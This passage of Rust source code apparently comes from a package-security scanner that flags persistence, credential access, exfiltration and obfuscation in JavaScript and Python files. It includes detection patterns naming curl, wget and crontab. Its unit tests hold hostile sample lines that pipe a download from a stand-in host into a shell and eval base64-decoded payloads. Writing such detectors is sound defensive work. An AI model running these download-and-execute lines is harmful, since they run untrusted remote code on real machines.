        entropy: shannon_entropy(bytes),
        ..FileScan::default()
    };
    // Type declaration files hold no executable code: only their entropy counts.
    if lang == Lang::Js && is_declaration_file(path) {
        return scan;
    }
    let mut per_rule: HashMap<&'static str, usize> = HashMap::new();
    let mut imports: BTreeSet<String> = BTreeSet::new();
    let applicable: Vec<&Rule> = rules()
        .iter()
        .filter(|rule| rule.langs.contains(&lang))
        .collect();
    let mut obfuscation_hits = 0usize;
    let mut max_line = 0usize;

    for (index, line) in text.lines().enumerate() {
        let number = index + 1;
        max_line = max_line.max(line.len());
        if lang == Lang::Python {
            if let Some(caps) = import_regex().captures(line) {
                if let Some(module) = caps.get(1) {
                    imports.insert(module.as_str().to_string());
                } else if let Some(list) = caps.get(2) {
                    for part in list.as_str().split(',') {
                        let top = part.trim().split([' ', '.']).next().unwrap_or("");
                        if !top.is_empty() {
                            imports.insert(top.to_string());
                        }
                    }
                }
            }
        }
        let trimmed = line.trim_start();
        let comment = match lang {
            Lang::Js => {
                trimmed.starts_with("//") || trimmed.starts_with('*') || trimmed.starts_with("/*")
            }
            Lang::Python | Lang::Shell => trimmed.starts_with('#'),
        };
        if is_pth && trimmed.starts_with("import ") {
            push_finding(
                &mut scan,
                &mut per_rule,
                "Executable .pth line",
                "persistence",
                "High",
                path,
                number,
                line,
                0,
                line.len(),
            );
        }
        if is_setup {
            if let Some(m) = setup_network_regex().find(line) {
                if !comment {
                    push_finding(
                        &mut scan,
                        &mut per_rule,
                        "Network access in setup.py",
                        "network",
                        "Medium",
                        path,
                        number,
                        line,
                        m.start(),
                        m.end(),
                    );
                }
            }
        }
        for rule in &applicable {
            if comment && rule.severity != "Critical" {
                continue;
            }
            if let Some(m) = rule.regex.find(line) {
                if !match_is_credible(rule, line, m.as_str()) {
                    continue;
                }
                if rule.category == "obfuscation" {
                    obfuscation_hits += 1;
                }
                push_finding(
                    &mut scan,
                    &mut per_rule,
                    rule.name,
                    rule.category,
                    rule.severity,
                    path,
                    number,
                    line,
                    m.start(),
                    m.end(),
                );
            }
        }
        if line.contains("http") {
            for m in url_regex().find_iter(line).take(5) {
                let url = m.as_str();
                if is_suspicious_url(url) && scan.suspicious_urls.len() < 20 {
                    scan.suspicious_urls.push((url.to_string(), number));
                }
            }
        }
    }

    let mut score = 0.35 * (obfuscation_hits.min(3) as f32);
    if scan.entropy > 5.9 && bytes.len() > 2048 {
        score += 0.3;
    }
    if max_line > 20_000 && scan.entropy > 5.5 {
        score += 0.2;
    }
    scan.obfuscation_score = score.min(1.0);
    scan.imports = imports.into_iter().take(40).collect();
    scan
}

/// `.d.ts`, `.d.mts` and `.d.cts` files.
fn is_declaration_file(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.ends_with(".d.ts") || lower.ends_with(".d.mts") || lower.ends_with(".d.cts")
}

fn write_context_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(>>?\s*[~$\w/."']|writeFile|appendFile|createWriteStream|\bopen\(|\becho\b|\btee\b|\bcp\b|\bln\s+-s|\bsed\s+-i|\.write\(|write_text|\bcrontab\b|\bsystemctl\b|\bschtasks\b|launchctl)"#,
        )
        .expect("write context regex")
    })
}

fn access_context_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(readFile|createReadStream|\bopen\(|read_text|read_bytes|\bcat\s|\bcp\s|\bscp\s|\btar\s|\bzip\b|\bcurl\b|\bwget\b|homedir|expanduser|\$HOME|~/|path\.join|os\.path\.join|\bPath\(|copyFile|shutil\.)",
        )
        .expect("access context regex")
    })
}

/// Second look at a rule match. Names that only appear in a lookup table (a
/// lexer's file-name list) or an environment read that is only `NODE_ENV` are
/// not what the rule is about.
fn match_is_credible(rule: &Rule, line: &str, matched: &str) -> bool {
    match rule.category {
        "persistence" => write_context_regex().is_match(line),
        "credential-theft" if rule.severity == "High" => access_context_regex().is_match(line),
        "exfiltration" if rule.name == "Environment sent over the network" => {
            let stripped = matched
                .replace("process.env.NODE_ENV", "")
                .replace("process.env.NODE_DEBUG", "")
                .replace("process.env.DEBUG", "")
                .replace("process.env.NODE_PATH", "");
            stripped.contains("process.env")
                || stripped.contains("environ")
                || stripped.contains("getenv")
        }
        _ => true,
    }
}

fn setup_network_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(urlopen|urlretrieve|requests\.(get|post)|\bwget\b|\bcurl\b)").expect("regex")
    })
}

#[allow(clippy::too_many_arguments)]
fn push_finding(
    scan: &mut FileScan,
    per_rule: &mut HashMap<&'static str, usize>,
    rule: &'static str,
    category: &'static str,
    severity: &'static str,
    path: &str,
    line_number: usize,
    line: &str,
    start: usize,
    end: usize,
) {
    if scan.findings.len() >= MAX_PER_FILE {
        return;
    }
    let seen = per_rule.entry(rule).or_insert(0);
    if *seen >= MAX_PER_RULE_PER_FILE {
        return;
    }
    *seen += 1;
    scan.findings.push(SourceFinding {
        rule: rule.to_string(),
        category: category.to_string(),
        severity: severity.to_string(),
        file: path.to_string(),
        line: line_number,
        evidence: evidence_window(line, start, end),
    });
}

/// Edit distance between two names: insertions, deletions, substitutions and
/// transposition of adjacent characters each cost 1.
pub fn edit_distance(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    // Three rolling rows (the transposition looks two rows back).
    let mut older = vec![0usize; b.len() + 1];
    let mut previous: Vec<usize> = (0..=b.len()).collect();
    let mut current = vec![0usize; b.len() + 1];
    for i in 1..=a.len() {
        current[0] = i;
        for j in 1..=b.len() {
            let cost = usize::from(a[i - 1] != b[j - 1]);
            let mut best = (previous[j] + 1)
                .min(current[j - 1] + 1)
                .min(previous[j - 1] + cost);
            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                best = best.min(older[j - 2] + 1);
            }
            current[j] = best;
        }
        std::mem::swap(&mut older, &mut previous);
        std::mem::swap(&mut previous, &mut current);
    }
    previous[b.len()]
}

/// Order of severities, higher is worse.
pub fn severity_rank(severity: &str) -> u8 {
    match severity {
        "Critical" => 4,
        "High" => 3,
        "Medium" => 2,
        "Low" => 1,
        _ => 0,
    }
}

/// Risk points the source findings add to a package's score (at most 80).
pub fn source_findings_score(findings: &[SourceFinding]) -> f32 {
    let worst = findings
        .iter()
        .map(|f| severity_rank(&f.severity))
        .max()
        .unwrap_or(0);
    let mut score = 0.0f32;
    if worst >= 4 {
        score += 40.0;
    }
    if findings.iter().any(|f| severity_rank(&f.severity) == 3)
        || (worst >= 4 && findings.iter().filter(|f| f.severity == "Critical").count() > 1)
    {
        score += 25.0;
    }
    if findings.iter().any(|f| f.severity == "Medium") {
        score += 8.0;
    }
    // Several independent kinds of behaviour are worse than one repeated.
    let categories: HashSet<&str> = findings
        .iter()
        .filter(|f| severity_rank(&f.severity) >= 3)
        .map(|f| f.category.as_str())
        .collect();
    score += 5.0 * (categories.len().saturating_sub(1).min(3) as f32);
    score.min(80.0)
}

/// Counts of findings by severity.
pub fn count_by_severity(findings: &[SourceFinding]) -> serde_json::Value {
    let mut counts = [0usize; 4];
    for finding in findings {
        match finding.severity.as_str() {
            "Critical" => counts[0] += 1,
            "High" => counts[1] += 1,
            "Medium" => counts[2] += 1,
            _ => counts[3] += 1,
        }
    }
    serde_json::json!({
        "critical": counts[0], "high": counts[1], "medium": counts[2], "low": counts[3]
    })
}

/// Sort findings worst first, then by file and line.
pub fn sort_findings(findings: &mut [SourceFinding]) {
    findings.sort_by(|a, b| {
        severity_rank(&b.severity)
            .cmp(&severity_rank(&a.severity))
            .then_with(|| a.file.cmp(&b.file))
            .then_with(|| a.line.cmp(&b.line))
    });
}

/// Heuristic: the argument looks like a registry package name or `name@version`
/// rather than a path, and no such path exists.
pub fn looks_like_registry_spec(raw: &str) -> bool {
    let raw = raw.trim();
    if raw.is_empty()
        || raw.starts_with('/')
        || raw.starts_with('.')
        || raw.starts_with('~')
        || raw.contains('\\')
        || raw.contains(' ')
        || raw.contains("://")
    {
        return false;
    }
    let slashes = raw.matches('/').count();
    // `express`, `lodash@4.17.4`, `requests==2.5.0`, `@scope/name`, `@scope/name@1.2.3`.
    if raw.starts_with('@') {
        return slashes == 1;
    }
    slashes == 0 && !raw.contains(':')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn registry_specs_are_recognised() {
        for spec in [
            "express",
            "lodash@4.17.4",
            "@scope/name",
            "requests==2.5.0",
            "Django",
        ] {
            assert!(looks_like_registry_spec(spec), "{spec}");
        }
        for spec in ["/tmp/x.tgz", "./x", "~/x", "dir/x.tgz", "C:\\x", ""] {
            assert!(!looks_like_registry_spec(spec), "{spec}");
        }
    }

    #[test]
    fn js_rules_report_file_line_and_evidence() {
        let src = "const a = 1;\nrequire('child_process').exec('curl http://example.invalid/p.sh | sh');\neval(Buffer.from('AAAA','base64').toString());\n";
        let scan = scan_source(Lang::Js, "index.js", src.as_bytes());
        let rules: Vec<(&str, usize)> = scan
            .findings
            .iter()
            .map(|f| (f.rule.as_str(), f.line))
            .collect();
        assert!(rules.contains(&("Download piped to a shell or interpreter", 2)));
        assert!(rules.contains(&("Process execution module", 2)));
        assert!(rules.contains(&("Eval of decoded payload", 3)));
        assert!(scan.findings.iter().all(|f| f.file == "index.js"));
    }

    #[test]
    fn python_rules_and_imports() {
        let src = "import os, subprocess\nfrom base64 import b64decode\nexec(base64.b64decode('AAAA'))\nsubprocess.call('curl http://x.invalid | sh', shell=True)\n";
        let scan = scan_source(Lang::Python, "pkg/mod.py", src.as_bytes());
        assert!(scan
            .findings
            .iter()
            .any(|f| f.rule == "Exec of decoded payload" && f.line == 3));
        assert!(scan
            .findings
            .iter()
            .any(|f| f.severity == "Critical" && f.line == 4));
        assert!(scan.imports.contains(&"subprocess".to_string()));
    }

    #[test]
    fn benign_code_is_quiet() {
        let src = "const re = /a(b)/;\nconst m = re.exec('ab');\nmodule.exports = function sum(a, b) { return a + b; };\n";
        assert!(scan_source(Lang::Js, "i.js", src.as_bytes())
            .findings
            .is_empty());
    }

    #[test]
    fn metadata_entries_are_recognised() {
        assert!(is_metadata_entry("package/._package.json"));
        assert!(is_metadata_entry("pax_global_header"));
        assert!(is_metadata_entry("__MACOSX/x/y"));
        assert!(!is_metadata_entry("package/package.json"));
    }
}
